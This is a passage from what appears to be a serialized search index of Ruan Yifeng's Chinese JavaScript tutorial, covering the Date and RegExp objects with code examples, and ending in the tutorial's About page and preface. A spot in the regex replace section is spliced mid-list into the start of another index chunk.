Jan 01 2013 00:00:00 GMT+0800 (CST)\nnew Date(2013, 0, 1, 0)\n// Tue Jan 01 2013 00:00:00 GMT+0800 (CST)\nnew Date(2013, 0, 1, 0, 0, 0, 0)\n// Tue Jan 01 2013 00:00:00 GMT+0800 (CST)</code></pre><p>上面代码中，不管有几个参数，返回的都是2013年1月1日零点。</p>\n<p>最后，各个参数的取值范围如下。</p>\n<ul>\n<li>年：使用四位数年份，比如<code>2000</code>。如果写成两位数或个位数，则加上<code>1900</code>，即<code>10</code>代表1910年。如果是负数，表示公元前。</li>\n<li>月：<code>0</code>表示一月，依次类推，<code>11</code>表示12月。</li>\n<li>日：<code>1</code>到<code>31</code>。</li>\n<li>小时：<code>0</code>到<code>23</code>。</li>\n<li>分钟：<code>0</code>到<code>59</code>。</li>\n<li>秒：<code>0</code>到<code>59</code></li>\n<li>毫秒：<code>0</code>到<code>999</code>。</li>\n</ul>\n<p>注意，月份从<code>0</code>开始计算，但是，天数从<code>1</code>开始计算。另外，除了日期的默认值为<code>1</code>，小时、分钟、秒钟和毫秒的默认值都是<code>0</code>。</p>\n<p>这些参数如果超出了正常范围，会被自动折算。比如，如果月设为<code>15</code>，就折算为下一年的4月。</p>\n<pre class=\"prettyprint language-javascript\"><code>new Date(2013, 15)\n// Tue Apr 01 2014 00:00:00 GMT+0800 (CST)\nnew Date(2013, 0, 0)\n// Mon Dec 31 2012 00:00:00 GMT+0800 (CST)</code></pre><p>上面代码的第二个例子，日期设为<code>0</code>，就代表上个月的最后一天。</p>\n<p>参数还可以使用负数，表示扣去的时间。</p>\n<pre class=\"prettyprint language-javascript\"><code>new Date(2013, -1)\n// Sat Dec 01 2012 00:00:00 GMT+0800 (CST)\nnew Date(2013, 0, -1)\n// Sun Dec 30 2012 00:00:00 GMT+0800 (CST)</code></pre><p>上面代码中，分别对月和日使用了负数，表示从基准日扣去相应的时间。</p>\n\n        <h2>\n            <a href='#日期的运算' class='header-anchor'>#</a>\n            <span>日期的运算</span>\n        </h2>\n    <p>类型自动转换时，<code>Date</code>实例如果转为数值，则等于对应的毫秒数；如果转为字符串，则等于对应的日期字符串。所以，两个日期实例对象进行减法运算时，返回的是它们间隔的毫秒数；进行加法运算时，返回的是两个字符串连接而成的新字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>var d1 = new Date(2000, 2, 1);\nvar d2 = new Date(2000, 3, 1);\n\nd2 - d1\n// 2678400000\nd2 + d1\n// &quot;Sat Apr 01 2000 00:00:00 GMT+0800 (CST)Wed Mar 01 2000 00:00:00 GMT+0800 (CST)&quot;</code></pre>\n        <h2>\n            <a href='#静态方法' class='header-anchor'>#</a>\n            <span>静态方法</span>\n        </h2>\n    \n        <h3>\n            <a href='#Date.now()' class='header-anchor'>#</a>\n            <span>Date.now()</span>\n        </h3>\n    <p><code>Date.now</code>方法返回当前时间距离时间零点（1970年1月1日 00:00:00 UTC）的毫秒数，相当于 Unix 时间戳乘以1000。</p>\n<pre class=\"prettyprint language-javascript\"><code>Date.now() // 1364026285194</code></pre>\n        <h3>\n            <a href='#Date.parse()' class='header-anchor'>#</a>\n            <span>Date.parse()</span>\n        </h3>\n    <p><code>Date.parse</code>方法用来解析日期字符串，返回该时间距离时间零点（1970年1月1日 00:00:00）的毫秒数。</p>\n<p>日期字符串应该符合 RFC 2822 和 ISO 8061 这两个标准，即<code>YYYY-MM-DDTHH:mm:ss.sssZ</code>格式，其中最后的<code>Z</code>表示时区。但是，其他格式也可以被解析，请看下面的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>Date.parse(&#039;Aug 9, 1995&#039;)\nDate.parse(&#039;January 26, 2011 13:51:50&#039;)\nDate.parse(&#039;Mon, 25 Dec 1995 13:30:00 GMT&#039;)\nDate.parse(&#039;Mon, 25 Dec 1995 13:30:00 +0430&#039;)\nDate.parse(&#039;2011-10-10&#039;)\nDate.parse(&#039;2011-10-10T14:48:00&#039;)</code></pre><p>上面的日期字符串都可以解析。</p>\n<p>如果解析失败，返回<code>NaN</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>Date.parse(&#039;xxx&#039;) // NaN</code></pre>\n        <h3>\n            <a href='#Date.UTC()' class='header-anchor'>#</a>\n            <span>Date.UTC()</span>\n        </h3>\n    <p><code>Date.UTC</code>方法接受年、月、日等变量作为参数，返回该时间距离时间零点（1970年1月1日 00:00:00 UTC）的毫秒数。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 格式\nDate.UTC(year, month[, date[, hrs[, min[, sec[, ms]]]]])\n\n// 用法\nDate.UTC(2011, 0, 1, 2, 3, 4, 567)\n// 1293847384567</code></pre><p>该方法的参数用法与<code>Date</code>构造函数完全一致，比如月从<code>0</code>开始计算，日期从<code>1</code>开始计算。区别在于<code>Date.UTC</code>方法的参数，会被解释为 UTC 时间（世界标准时间），<code>Date</code>构造函数的参数会被解释为当前时区的时间。</p>\n\n        <h2>\n            <a href='#实例方法' class='header-anchor'>#</a>\n            <span>实例方法</span>\n        </h2>\n    <p><code>Date</code>的实例对象，有几十个自己的方法，除了<code>valueOf</code>和<code>toString</code>，可以分为以下三类。</p>\n<ul>\n<li><code>to</code>类：从<code>Date</code>对象返回一个字符串，表示指定的时间。</li>\n<li><code>get</code>类：获取<code>Date</code>对象的日期和时间。</li>\n<li><code>set</code>类：设置<code>Date</code>对象的日期和时间。</li>\n</ul>\n\n        <h3>\n            <a href='#Date.prototype.valueOf()' class='header-anchor'>#</a>\n            <span>Date.prototype.valueOf()</span>\n        </h3>\n    <p><code>valueOf</code>方法返回实例对象距离时间零点（1970年1月1日00:00:00 UTC）对应的毫秒数，该方法等同于<code>getTime</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var d = new Date();\n\nd.valueOf() // 1362790014817\nd.getTime() // 1362790014817</code></pre><p>预期为数值的场合，<code>Date</code>实例会自动调用该方法，所以可以用下面的方法计算时间的间隔。</p>\n<pre class=\"prettyprint language-javascript\"><code>var start = new Date();\n// ...\nvar end = new Date();\nvar elapsed = end - start;</code></pre>\n        <h3>\n            <a href='#to-类方法' class='header-anchor'>#</a>\n            <span>to 类方法</span>\n        </h3>\n    <p><strong>（1）Date.prototype.toString()</strong></p>\n<p><code>toString</code>方法返回一个完整的日期字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>var d = new Date(2013, 0, 1);\n\nd.toString()\n// &quot;Tue Jan 01 2013 00:00:00 GMT+0800 (CST)&quot;\nd\n// &quot;Tue Jan 01 2013 00:00:00 GMT+0800 (CST)&quot;</code></pre><p>因为<code>toString</code>是默认的调用方法，所以如果直接读取<code>Date</code>实例，就相当于调用这个方法。</p>\n<p><strong>（2）Date.prototype.toUTCString()</strong></p>\n<p><code>toUTCString</code>方法返回对应的 UTC 时间，也就是比北京时间晚8个小时。</p>\n<pre class=\"prettyprint language-javascript\"><code>var d = new Date(2013, 0, 1);\n\nd.toUTCString()\n// &quot;Mon, 31 Dec 2012 16:00:00 GMT&quot;</code></pre><p><strong>（3）Date.prototype.toISOString()</strong></p>\n<p><code>toISOString</code>方法返回对应时间的 ISO8601 写法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var d = new Date(2013, 0, 1);\n\nd.toISOString()\n// &quot;2012-12-31T16:00:00.000Z&quot;</code></pre><p>注意，<code>toISOString</code>方法返回的总是 UTC 时区的时间。</p>\n<p><strong>（4）Date.prototype.toJSON()</strong></p>\n<p><code>toJSON</code>方法返回一个符合 JSON 格式的 ISO 日期字符串，与<code>toISOString</code>方法的返回结果完全相同。</p>\n<pre class=\"prettyprint language-javascript\"><code>var d = new Date(2013, 0, 1);\n\nd.toJSON()\n// &quot;2012-12-31T16:00:00.000Z&quot;</code></pre><p><strong>（5）Date.prototype.toDateString()</strong></p>\n<p><code>toDateString</code>方法返回日期字符串（不含小时、分和秒）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var d = new Date(2013, 0, 1);\nd.toDateString() // &quot;Tue Jan 01 2013&quot;</code></pre><p><strong>（6）Date.prototype.toTimeString()</strong></p>\n<p><code>toTimeString</code>方法返回时间字符串（不含年月日）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var d = new Date(2013, 0, 1);\nd.toTimeString() // &quot;00:00:00 GMT+0800 (CST)&quot;</code></pre><p><strong>（7）Date.prototype.toLocaleDateString()</strong></p>\n<p><code>toLocaleDateString</code>方法返回一个字符串，代表日期的当地写法（不含小时、分和秒）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var d = new Date(2013, 0, 1);\n\nd.toLocaleDateString()\n// 中文版浏览器为&quot;2013年1月1日&quot;\n// 英文版浏览器为&quot;1/1/2013&quot;</code></pre><p><strong>（8）Date.prototype.toLocaleTimeString()</strong></p>\n<p><code>toLocaleTimeString</code>方法返回一个字符串，代表时间的当地写法（不含年月日）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var d = new Date(2013, 0, 1);\n\nd.toLocaleTimeString()\n// 中文版浏览器为&quot;上午12:00:00&quot;\n// 英文版浏览器为&quot;12:00:00 AM&quot;</code></pre>\n        <h3>\n            <a href='#get-类方法' class='header-anchor'>#</a>\n            <span>get 类方法</span>\n        </h3>\n    <p><code>Date</code>对象提供了一系列<code>get*</code>方法，用来获取实例对象某个方面的值。</p>\n<ul>\n<li><code>getTime()</code>：返回实例距离1970年1月1日00:00:00的毫秒数，等同于<code>valueOf</code>方法。</li>\n<li><code>getDate()</code>：返回实例对象对应每个月的几号（从1开始）。</li>\n<li><code>getDay()</code>：返回星期几，星期日为0，星期一为1，以此类推。</li>\n<li><code>getYear()</code>：返回距离1900的年数。</li>\n<li><code>getFullYear()</code>：返回四位的年份。</li>\n<li><code>getMonth()</code>：返回月份（0表示1月，11表示12月）。</li>\n<li><code>getHours()</code>：返回小时（0-23）。</li>\n<li><code>getMilliseconds()</code>：返回毫秒（0-999）。</li>\n<li><code>getMinutes()</code>：返回分钟（0-59）。</li>\n<li><code>getSeconds()</code>：返回秒（0-59）。</li>\n<li><code>getTimezoneOffset()</code>：返回当前时间与 UTC 的时区差异，以分钟表示，返回结果考虑到了夏令时因素。</li>\n</ul>\n<p>所有这些<code>get*</code>方法返回的都是整数，不同方法返回值的范围不一样。</p>\n<ul>\n<li>分钟和秒：0 到 59</li>\n<li>小时：0 到 23</li>\n<li>星期：0（星期天）到 6（星期六）</li>\n<li>日期：1 到 31</li>\n<li>月份：0（一月）到 11（十二月）</li>\n<li>年份：距离1900年的年数</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>var d = new Date(&#039;January 6, 2013&#039;);\n\nd.getDate() // 6\nd.getMonth() // 0\nd.getYear() // 113\nd.getFullYear() // 2013\nd.getTimezoneOffset() // -480</code></pre><p>上面代码中，最后一行返回<code>-480</code>，即 UTC 时间减去当前时间，单位是分钟。<code>-480</code>表示 UTC 比当前时间少480分钟，即当前时区比 UTC 早8个小时。</p>\n<p>下面是一个例子，计算本年度还剩下多少天。</p>\n<pre class=\"prettyprint language-javascript\"><code>function leftDays() {\n  var today = new Date();\n  var endYear = new Date(today.getFullYear(), 11, 31, 23, 59, 59, 999);\n  var msPerDay = 24 * 60 * 60 * 1000;\n  return Math.round((endYear.getTime() - today.getTime()) / msPerDay);\n}</code></pre><p>上面这些<code>get*</code>方法返回的都是当前时区的时间，<code>Date</code>对象还提供了这些方法对应的 UTC 版本，用来返回 UTC 时间。</p>\n<ul>\n<li><code>getUTCDate()</code></li>\n<li><code>getUTCFullYear()</code></li>\n<li><code>getUTCMonth()</code></li>\n<li><code>getUTCDay()</code></li>\n<li><code>getUTCHours()</code></li>\n<li><code>getUTCMinutes()</code></li>\n<li><code>getUTCSeconds()</code></li>\n<li><code>getUTCMilliseconds()</code></li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>var d = new Date(&#039;January 6, 2013&#039;);\n\nd.getDate() // 6\nd.getUTCDate() // 5</code></pre><p>上面代码中，实例对象<code>d</code>表示当前时区（东八时区）的1月6日0点0分0秒，这个时间对于当前时区来说是1月6日，所以<code>getDate</code>方法返回6，对于 UTC 时区来说是1月5日，所以<code>getUTCDate</code>方法返回5。</p>\n\n        <h3>\n            <a href='#set-类方法' class='header-anchor'>#</a>\n            <span>set 类方法</span>\n        </h3>\n    <p><code>Date</code>对象提供了一系列<code>set*</code>方法，用来设置实例对象的各个方面。</p>\n<ul>\n<li><code>setDate(date)</code>：设置实例对象对应的每个月的几号（1-31），返回改变后毫秒时间戳。</li>\n<li><code>setYear(year)</code>: 设置距离1900年的年数。</li>\n<li><code>setFullYear(year [, month, date])</code>：设置四位年份。</li>\n<li><code>setHours(hour [, min, sec, ms])</code>：设置小时（0-23）。</li>\n<li><code>setMilliseconds()</code>：设置毫秒（0-999）。</li>\n<li><code>setMinutes(min [, sec, ms])</code>：设置分钟（0-59）。</li>\n<li><code>setMonth(month [, date])</code>：设置月份（0-11）。</li>\n<li><code>setSeconds(sec [, ms])</code>：设置秒（0-59）。</li>\n<li><code>setTime(milliseconds)</code>：设置毫秒时间戳。</li>\n</ul>\n<p>这些方法基本是跟<code>get*</code>方法一一对应的，但是没有<code>setDay</code>方法，因为星期几是计算出来的，而不是设置的。另外，需要注意的是，凡是涉及到设置月份，都是从0开始算的，即<code>0</code>是1月，<code>11</code>是12月。</p>\n<pre class=\"prettyprint language-javascript\"><code>var d = new Date (&#039;January 6, 2013&#039;);\n\nd // Sun Jan 06 2013 00:00:00 GMT+0800 (CST)\nd.setDate(9) // 1357660800000\nd // Wed Jan 09 2013 00:00:00 GMT+0800 (CST)</code></pre><p><code>set*</code>方法的参数都会自动折算。以<code>setDate</code>为例，如果参数超过当月的最大天数，则向下一个月顺延，如果参数是负数，表示从上个月的最后一天开始减去的天数。</p>\n<pre class=\"prettyprint language-javascript\"><code>var d1 = new Date(&#039;January 6, 2013&#039;);\n\nd1.setDate(32) // 1359648000000\nd1 // Fri Feb 01 2013 00:00:00 GMT+0800 (CST)\n\nvar d2 = new Date (&#039;January 6, 2013&#039;);\n\nd.setDate(-1) // 1356796800000\nd // Sun Dec 30 2012 00:00:00 GMT+0800 (CST)</code></pre><p><code>set</code>类方法和<code>get</code>类方法，可以结合使用，得到相对时间。</p>\n<pre class=\"prettyprint language-javascript\"><code>var d = new Date();\n\n// 将日期向后推1000天\nd.setDate(d.getDate() + 1000);\n// 将时间设为6小时后\nd.setHours(d.getHours() + 6);\n// 将年份设为去年\nd.setFullYear(d.getFullYear() - 1);</code></pre><p><code>set*</code>系列方法除了<code>setTime()</code>和<code>setYear()</code>，都有对应的 UTC 版本，即设置 UTC 时区的时间。</p>\n<ul>\n<li><code>setUTCDate()</code></li>\n<li><code>setUTCFullYear()</code></li>\n<li><code>setUTCHours()</code></li>\n<li><code>setUTCMilliseconds()</code></li>\n<li><code>setUTCMinutes()</code></li>\n<li><code>setUTCMonth()</code></li>\n<li><code>setUTCSeconds()</code></li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>var d = new Date(&#039;January 6, 2013&#039;);\nd.getUTCHours() // 16\nd.setUTCHours(22) // 1357423200000\nd // Sun Jan 06 2013 06:00:00 GMT+0800 (CST)</code></pre><p>上面代码中，本地时区（东八时区）的1月6日0点0分，是 UTC 时区的前一天下午16点。设为 UTC 时区的22点以后，就变为本地时区的上午6点。</p>\n\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Rakhitha Nimesh，<a href=\"http://jspro.com/raw-javascript/beginners-guide-to-javascript-date-and-time/\">Getting Started with the Date Object</a></li>\n<li>Ilya Kantor, <a href=\"http://javascript.info/tutorial/datetime-functions\">Date/Time functions</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"标准库","link":"javascript:void(0)"},{"title":"RegExp 对象","link":"/stdlib/regexp.html"}],"content":"\n        <h1>\n            <a href='#RegExp-对象' class='header-anchor'>#</a>\n            <span>RegExp 对象</span>\n        </h1>\n    <p><code>RegExp</code>对象提供正则表示式的功能。</p>\n\n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    <p>正则表达式（regular expression）是一种表达文本模式（即字符串结构）的方法，有点像字符串的模板，常常用来按照“给定模式”匹配文本。比如，正则表达式给出一个 Email 地址的模式，然后用它来确定一个字符串是否为 Email 地址。JavaScript 的正则表达式体系是参照 Perl 5 建立的。</p>\n<p>新建正则表达式有两种方法。一种是使用字面量，以斜杠表示开始和结束。</p>\n<pre class=\"prettyprint language-javascript\"><code>var regex = /xyz/;</code></pre><p>另一种是使用<code>RegExp</code>构造函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>var regex = new RegExp(&#039;xyz&#039;);</code></pre><p>上面两种写法是等价的，都新建了一个内容为<code>xyz</code>的正则表达式对象。它们的主要区别是，第一种方法在引擎编译代码时，就会新建正则表达式，第二种方法在运行时新建正则表达式，所以前者的效率较高。而且，前者比较便利和直观，所以实际应用中，基本上都采用字面量定义正则表达式。</p>\n<p><code>RegExp</code>构造函数还可以接受第二个参数，表示修饰符（详细解释见下文）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var regex = new RegExp(&#039;xyz&#039;, &#039;i&#039;);\n// 等价于\nvar regex = /xyz/i;</code></pre><p>上面代码中，正则表达式<code>/xyz/</code>有一个修饰符<code>i</code>。</p>\n\n        <h2>\n            <a href='#实例属性' class='header-anchor'>#</a>\n            <span>实例属性</span>\n        </h2>\n    <p>正则对象的实例属性分成两类。</p>\n<p>一类是修饰符相关，返回一个布尔值，表示对应的修饰符是否设置。</p>\n<ul>\n<li><strong>RegExp.prototype.ignoreCase</strong>：返回一个布尔值，表示是否设置了<code>i</code>修饰符。</li>\n<li><strong>RegExp.prototype.global</strong>：返回一个布尔值，表示是否设置了<code>g</code>修饰符。</li>\n<li><strong>RegExp.prototype.multiline</strong>：返回一个布尔值，表示是否设置了<code>m</code>修饰符。</li>\n</ul>\n<p>上面三个属性都是只读的。</p>\n<pre class=\"prettyprint language-javascript\"><code>var r = /abc/igm;\n\nr.ignoreCase // true\nr.global // true\nr.multiline // true</code></pre><p>另一类是与修饰符无关的属性，主要是下面两个。</p>\n<ul>\n<li><code>RegExp.prototype.lastIndex</code>：返回一个整数，表示下一次开始搜索的位置。该属性可读写，但是只在进行连续搜索时有意义，详细介绍请看后文。</li>\n<li><code>RegExp.prototype.source</code>：返回正则表达式的字符串形式（不包括反斜杠），该属性只读。</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>var r = /abc/igm;\n\nr.lastIndex // 0\nr.source // &quot;abc&quot;</code></pre>\n        <h2>\n            <a href='#实例方法' class='header-anchor'>#</a>\n            <span>实例方法</span>\n        </h2>\n    \n        <h3>\n            <a href='#RegExp.prototype.test()' class='header-anchor'>#</a>\n            <span>RegExp.prototype.test()</span>\n        </h3>\n    <p>正则实例对象的<code>test</code>方法返回一个布尔值，表示当前模式是否能匹配参数字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>/cat/.test(&#039;cats and dogs&#039;) // true</code></pre><p>上面代码验证参数字符串之中是否包含<code>cat</code>，结果返回<code>true</code>。</p>\n<p>如果正则表达式带有<code>g</code>修饰符，则每一次<code>test</code>方法都从上一次结束的位置开始向后匹配。</p>\n<pre class=\"prettyprint language-javascript\"><code>var r = /x/g;\nvar s = &#039;_x_x&#039;;\n\nr.lastIndex // 0\nr.test(s) // true\n\nr.lastIndex // 2\nr.test(s) // true\n\nr.lastIndex // 4\nr.test(s) // false</code></pre><p>上面代码的正则表达式使用了<code>g</code>修饰符，表示是全局搜索，会有多个结果。接着，三次使用<code>test</code>方法，每一次开始搜索的位置都是上一次匹配的后一个位置。</p>\n<p>带有<code>g</code>修饰符时，可以通过正则对象的<code>lastIndex</code>属性指定开始搜索的位置。</p>\n<pre class=\"prettyprint language-javascript\"><code>var r = /x/g;\nvar s = &#039;_x_x&#039;;\n\nr.lastIndex = 4;\nr.test(s) // false</code></pre><p>上面代码指定从字符串的第五个位置开始搜索，这个位置是没有字符的，所以返回<code>false</code>。</p>\n<p>注意，带有<code>g</code>修饰符时，正则表达式内部会记住上一次的<code>lastIndex</code>属性，这时不应该更换所要匹配的字符串，否则会有一些难以察觉的错误。</p>\n<pre class=\"prettyprint language-javascript\"><code>var r = /bb/g;\nr.test(&#039;bb&#039;) // true\nr.test(&#039;-bb-&#039;) // false </code></pre><p>上面代码中，由于正则表达式<code>r</code>是从上一次的<code>lastIndex</code>位置开始匹配，导致第二次执行<code>test</code>方法时出现预期以外的结果。</p>\n<p><code>lastIndex</code>属性只对同一个正则表达式有效，所以下面这样写是错误的。</p>\n<pre class=\"prettyprint language-javascript\"><code>var count = 0;\nwhile (/a/g.test(&#039;babaa&#039;)) count++;</code></pre><p>上面代码会导致无限循环，因为<code>while</code>循环的每次匹配条件都是一个新的正则表达式，导致<code>lastIndex</code>属性总是等于0。</p>\n<p>如果正则模式是一个空字符串，则匹配所有字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>new RegExp(&#039;&#039;).test(&#039;abc&#039;)\n// true</code></pre>\n        <h3>\n            <a href='#RegExp.prototype.exec()' class='header-anchor'>#</a>\n            <span>RegExp.prototype.exec()</span>\n        </h3>\n    <p>正则实例对象的<code>exec</code>方法，用来返回匹配结果。如果发现匹配，就返回一个数组，成员是匹配成功的子字符串，否则返回<code>null</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var s = &#039;_x_x&#039;;\nvar r1 = /x/;\nvar r2 = /y/;\n\nr1.exec(s) // [&quot;x&quot;]\nr2.exec(s) // null</code></pre><p>上面代码中，正则对象<code>r1</code>匹配成功，返回一个数组，成员是匹配结果；正则对象<code>r2</code>匹配失败，返回<code>null</code>。</p>\n<p>如果正则表示式包含圆括号（即含有“组匹配”），则返回的数组会包括多个成员。第一个成员是整个匹配成功的结果，后面的成员就是圆括号对应的匹配成功的组。也就是说，第二个成员对应第一个括号，第三个成员对应第二个括号，以此类推。整个数组的<code>length</code>属性等于组匹配的数量再加1。</p>\n<pre class=\"prettyprint language-javascript\"><code>var s = &#039;_x_x&#039;;\nvar r = /_(x)/;\n\nr.exec(s) // [&quot;_x&quot;, &quot;x&quot;]</code></pre><p>上面代码的<code>exec</code>方法，返回一个数组。第一个成员是整个匹配的结果，第二个成员是圆括号匹配的结果。</p>\n<p><code>exec</code>方法的返回数组还包含以下两个属性：</p>\n<ul>\n<li><code>input</code>：整个原字符串。</li>\n<li><code>index</code>：整个模式匹配成功的开始位置（从0开始计数）。</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>var r = /a(b+)a/;\nvar arr = r.exec(&#039;_abbba_aba_&#039;);\n\narr // [&quot;abbba&quot;, &quot;bbb&quot;]\n\narr.index // 1\narr.input // &quot;_abbba_aba_&quot;</code></pre><p>上面代码中的<code>index</code>属性等于1，是因为从原字符串的第二个位置开始匹配成功。</p>\n<p>如果正则表达式加上<code>g</code>修饰符，则可以使用多次<code>exec</code>方法，下一次搜索的位置从上一次匹配成功结束的位置开始。</p>\n<pre class=\"prettyprint language-javascript\"><code>var reg = /a/g;\nvar str = &#039;abc_abc_abc&#039;\n\nvar r1 = reg.exec(str);\nr1 // [&quot;a&quot;]\nr1.index // 0\nreg.lastIndex // 1\n\nvar r2 = reg.exec(str);\nr2 // [&quot;a&quot;]\nr2.index // 4\nreg.lastIndex // 5\n\nvar r3 = reg.exec(str);\nr3 // [&quot;a&quot;]\nr3.index // 8\nreg.lastIndex // 9\n\nvar r4 = reg.exec(str);\nr4 // null\nreg.lastIndex // 0</code></pre><p>上面代码连续用了四次<code>exec</code>方法，前三次都是从上一次匹配结束的位置向后匹配。当第三次匹配结束以后，整个字符串已经到达尾部，匹配结果返回<code>null</code>，正则实例对象的<code>lastIndex</code>属性也重置为<code>0</code>，意味着第四次匹配将从头开始。</p>\n<p>利用<code>g</code>修饰符允许多次匹配的特点，可以用一个循环完成全部匹配。</p>\n<pre class=\"prettyprint language-javascript\"><code>var reg = /a/g;\nvar str = &#039;abc_abc_abc&#039;\n\nwhile(true) {\n  var match = reg.exec(str);\n  if (!match) break;\n  console.log(&#039;#&#039; + match.index + &#039;:&#039; + match[0]);\n}\n// #0:a\n// #4:a\n// #8:a</code></pre><p>上面代码中，只要<code>exec</code>方法不返回<code>null</code>，就会一直循环下去，每次输出匹配的位置和匹配的文本。</p>\n<p>正则实例对象的<code>lastIndex</code>属性不仅可读，还可写。设置了<code>g</code>修饰符的时候，只要手动设置了<code>lastIndex</code>的值，就会从指定位置开始匹配。</p>\n\n        <h2>\n            <a href='#字符串的实例方法' class='header-anchor'>#</a>\n            <span>字符串的实例方法</span>\n        </h2>\n    <p>字符串的实例方法之中，有4种与正则表达式有关。</p>\n<ul>\n<li><code>String.prototype.match()</code>：返回一个数组，成员是所有匹配的子字符串。</li>\n<li><code>String.prototype.search()</code>：按照给定的正则表达式进行搜索，返回一个整数，表示匹配开始的位置。</li>\n<li><code>String.prototype.replace()</code>：按照给定的正则表达式进行替换，返回替换后的字符串。</li>\n<li><code>String.prototype.split()</code>：按照给定规则进行字符串分割，返回一个数组，包含分割后的各个成员。</li>\n</ul>\n\n        <h3>\n            <a href='#String.prototype.match()' class='header-anchor'>#</a>\n            <span>String.prototype.match()</span>\n        </h3>\n    <p>字符串实例对象的<code>match</code>方法对字符串进行正则匹配，返回匹配结果。</p>\n<pre class=\"prettyprint language-javascript\"><code>var s = &#039;_x_x&#039;;\nvar r1 = /x/;\nvar r2 = /y/;\n\ns.match(r1) // [&quot;x&quot;]\ns.match(r2) // null</code></pre><p>从上面代码可以看到，字符串的<code>match</code>方法与正则对象的<code>exec</code>方法非常类似：匹配成功返回一个数组，匹配失败返回<code>null</code>。</p>\n<p>如果正则表达式带有<code>g</code>修饰符，则该方法与正则对象的<code>exec</code>方法行为不同，会一次性返回所有匹配成功的结果。</p>\n<pre class=\"prettyprint language-javascript\"><code>var s = &#039;abba&#039;;\nvar r = /a/g;\n\ns.match(r) // [&quot;a&quot;, &quot;a&quot;]\nr.exec(s) // [&quot;a&quot;]</code></pre><p>设置正则表达式的<code>lastIndex</code>属性，对<code>match</code>方法无效，匹配总是从字符串的第一个字符开始。</p>\n<pre class=\"prettyprint language-javascript\"><code>var r = /a|b/g;\nr.lastIndex = 7;\n&#039;xaxb&#039;.match(r) // [&#039;a&#039;, &#039;b&#039;]\nr.lastIndex // 0</code></pre><p>上面代码表示，设置正则对象的<code>lastIndex</code>属性是无效的。</p>\n\n        <h3>\n            <a href='#String.prototype.search()' class='header-anchor'>#</a>\n            <span>String.prototype.search()</span>\n        </h3>\n    <p>字符串对象的<code>search</code>方法，返回第一个满足条件的匹配结果在整个字符串中的位置。如果没有任何匹配，则返回<code>-1</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;_x_x&#039;.search(/x/)\n// 1</code></pre><p>上面代码中，第一个匹配结果出现在字符串的<code>1</code>号位置。</p>\n\n        <h3>\n            <a href='#String.prototype.replace()' class='header-anchor'>#</a>\n            <span>String.prototype.replace()</span>\n        </h3>\n    <p>字符串对象的<code>replace</code>方法可以替换匹配的值。它接受两个参数，第一个是正则表达式，表示搜索模式，第二个是替换的内容。</p>\n<pre class=\"prettyprint language-javascript\"><code>str.replace(search, replacement)</code></pre><p>正则表达式如果不加<code>g</code>修饰符，就替换第一个匹配成功的值，否则替换所有匹配成功的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;aaa&#039;.replace(&#039;a&#039;, &#039;b&#039;) // &quot;baa&quot;\n&#039;aaa&#039;.replace(/a/, &#039;b&#039;) // &quot;baa&quot;\n&#039;aaa&#039;.replace(/a/g, &#039;b&#039;) // &quot;bbb&quot;</code></pre><p>上面代码中，最后一个正则表达式使用了<code>g</code>修饰符，导致所有的<code>b</code>都被替换掉了。</p>\n<p><code>replace</code>方法的一个应用，就是消除字符串首尾两端的空格。</p>\n<pre class=\"prettyprint language-javascript\"><code>var str = &#039;  #id div.class  &#039;;\n\nstr.replace(/^\\s+|\\s+$/g, &#039;&#039;)\n// &quot;#id div.class&quot;</code></pre><p><code>replace</code>方法的第二个参数可以使用美元符号<code>$</code>，用来指代所替换的内容。</p>\n<ul>\n<li>__448__amp;：匹配的子字符串。</li>\n<li>(function(){var content=[{"context":[{"title":"关于","link":"/index.html"}],"content":"\n        <h1>\n            <a href='#关于此教程' class='header-anchor'>#</a>\n            <span>关于此教程</span>\n        </h1>\n    <p>你现在看到的是阮一峰老师的JavaScript教程。</p>\n<p>本教程的作者是阮一峰老师，采用<a href=\"https://creativecommons.org/licenses/by-sa/3.0/deed.zh\">知识共享 署名-相同方式共享 3.0协议</a>。</p>\n<p>本文档只是将其制作成了 <a href=\"https://github.com/teadocs/teadocs\">Teadocs</a> 的版本。</p>\n\n        <h1>\n            <a href='#本文档构建说明' class='header-anchor'>#</a>\n            <span>本文档构建说明</span>\n        </h1>\n    <p>请访问 <a href=\"https://github.com/teadocs/teadocs\">Teadocs</a> 的github地址以查找更多帮助。</p>\n"},{"context":[{"title":"阮一峰前言","link":"/preface.html"}],"content":"\n        <h1>\n            <a href='#前言' class='header-anchor'>#</a>\n            <span>前言</span>\n        </h1>\n    <p>我写这本教程，主要原因是自己需要。</p>\n<p>编程时，往往需要查阅资料，确定准确用法。理想的 JavaScript 参考书，应该简明易懂，一目了然，告诉我有哪些注意点，提供代码范例。如果涉及重要概念，还应该适当讲解。可是大多数时候，现实都不是如此。找到的资料冗长难懂，抓不住重点，有时还很陈旧，跟不上语言标准和浏览器的快速发展，且大多数是英文资料。</p>\n<p>学习过程中，我做了很多 JavaScript 